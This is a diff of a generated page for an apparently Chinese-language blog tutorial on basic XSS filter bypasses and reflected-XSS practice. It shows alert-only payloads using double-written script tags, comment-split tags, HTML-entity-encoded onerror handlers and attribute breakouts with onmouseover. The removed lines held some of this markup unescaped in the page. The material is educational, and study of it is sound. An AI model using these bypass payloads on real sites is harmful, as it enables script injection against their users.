@@ -200,12 +200,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>1.2k Words</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.6k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>4 Mins</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>5 Mins</span>
         </span>
     
     
@@ -266,9 +266,20 @@
 </blockquote>
 <h2 id="XSS基础过滤"><a href="#XSS基础过滤" class="headerlink" title="XSS基础过滤"></a>XSS基础过滤</h2><p>1.抓包重新插入，或修改前端HTML代码</p>
 <p>2.修改大小写，若正则匹配只匹配小写，则可绕过</p>
-<p>3.双写（拼凑），例如&lt;scri<script>pt>alert(111)</scri</script>pt&gt;，后台即使过滤script，也有只过滤一次的可能</p>
-<p>4.注释干扰，例如&lt;scri<!--test-->pt&gt;alert(111)&lt;/sc<!--test-->ript&gt;，加上注释后，有绕过后台过滤机制的可能</p>
-<p>5.编码，例 &lt;img src=x onerror=alert(‘xss’)&gt; 经过HTML编码为： <img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;> </p>
+<p>3.双写（拼凑），例如</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri<span class="tag">&lt;<span class="name">script</span>&gt;</span>pt&gt;alert(111)&lt;/scri<span class="tag">&lt;/<span class="name">script</span>&gt;<span class="name">pt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>后台即使过滤script，也有只过滤一次的可能</p>
+<p>4.注释干扰，例如</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri<span class="comment">&lt;!--test--&gt;</span>pt&gt;alert(111)&lt;/sc<span class="comment">&lt;!--test--&gt;</span>ript&gt;</span><br></pre></td></tr></table></figure>
+
+<p>加上注释后，有绕过后台过滤机制的可能</p>
+<p>5.编码，例 </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>经过HTML编码为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
 <h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="反射型xss（get-or-post）"><a href="#反射型xss（get-or-post）" class="headerlink" title="反射型xss（get or post）"></a>反射型xss（get or post）</h3><p>先判断有无过滤，然后写入xss代码</p>
 <p>示例：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;BEACON&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
@@ -281,12 +292,9 @@
                       alt="img"
                 ></p>
 <p>我们先通过 “&gt; 闭合了herf标签，然后再插入相应的payload</p>
-<p>根据提示构造payload ‘&gt;<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="#"
-                      onmouseover="alert('xss')"
-                > </p>
+<p>根据提示构造payload ‘</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
 <h4 id="例二："><a href="#例二：" class="headerlink" title="例二："></a>例二：</h4><p><img  
                      lazyload
                      src="/images/loading.svg"
